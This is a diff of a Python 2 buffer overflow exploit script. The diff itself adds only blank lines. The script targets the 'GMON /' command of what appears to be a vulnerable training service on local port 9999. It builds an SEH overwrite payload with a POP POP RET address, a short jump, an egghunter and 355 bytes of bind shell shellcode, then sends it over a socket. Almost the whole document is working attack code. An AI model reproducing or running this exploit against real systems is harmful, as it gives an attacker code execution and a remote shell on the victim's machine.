@@ -2,16 +2,19 @@ import socket
 import struct
 import os
 import sys
+
 target_command = "GMON /"
 offset = 3522
 eip = struct.pack("<I", 0x6250172b)              # POP POP RET
 short_jmp = "\xEB\x09\x90\x90"                   # Short JMP
 egg = "T00WT00W"                         
+
 # Egghunter (egg = T00W)
 egghunter = ""
 egghunter += "\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
 egghunter += "\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff"
 egghunter += "\xe7"
+
 # Bind Shell (355 Bytes)
 buf =  ""
 buf += "\xda\xc8\xb8\xaa\xa0\x38\x73\xd9\x74\x24\xf4\x5a\x2b"
@@ -42,6 +45,7 @@ buf += "\x66\xcd\x9f\xd6\x47\x99\x17\xaf\xb5\x39\xd7\x7a\x7e"
 buf += "\x59\x3a\xae\x8b\xf2\xe3\x3b\x36\x9f\x13\x96\x75\xa6"
 buf += "\x97\x12\x06\x5d\x87\x57\x03\x19\x0f\x84\x79\x32\xfa"
 buf += "\xaa\x2e\x33\x2f"
+
 payload = ""
 payload += target_command
 payload += "A" * 100
@@ -53,7 +57,9 @@ payload += eip
 payload += "\x90" * 10
 payload += egghunter
 payload += "C" * (4103 - offset - len(eip) - 10 - len(egghunter))
+
 print "[+] Sending buffer (Size: %d)" % len(payload)
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('127.0.0.1', 9999))
 print(s.recv(1024))
